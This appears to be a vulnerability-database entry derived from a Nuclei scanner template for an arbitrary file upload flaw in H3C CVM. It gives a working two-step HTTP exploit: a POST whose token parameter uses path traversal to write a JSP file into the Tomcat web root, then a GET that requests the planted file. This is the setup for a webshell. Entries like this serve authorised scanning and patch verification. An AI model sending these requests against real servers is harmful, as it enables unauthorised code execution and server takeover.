# Nuclei Template: H3C CVM - Arbitrary File Upload
**Template ID:** h3c-cvm-arbitrary-file-upload
**Vulnerability Class:** Path Traversal
**Severity:** Critical
**Source:** Nuclei Template (`h3c-cvm-arbitrary-file-upload.yaml`)

## Vulnerability Information & PoC

## Description
An H3C CVM vulnerability allows for arbitrary file uploads. This enables attackers to upload any files they choose, acquire webshells, manipulate server permissions, and access sensitive information.

## Steps to reproduce / Exploit Payload
```http
POST /cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/{{filename}}.jsp&name=222" HTTP/1.1
Host: {{Hostname}}
Content-range: bytes 0-10/20
Accept-Encoding: gzip, deflate

{{payload}}

GET /cas/js/lib/buttons/{{filename}}.jsp HTTP/1.1
Host: {{Hostname}}
```

## References
- https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/h3c-cvm-fileupload.yaml
- https://github.com/tr0uble-mAker/POC-bomber/blob/main/pocs/redteam/h3c_cvm_fileupload_2022.py
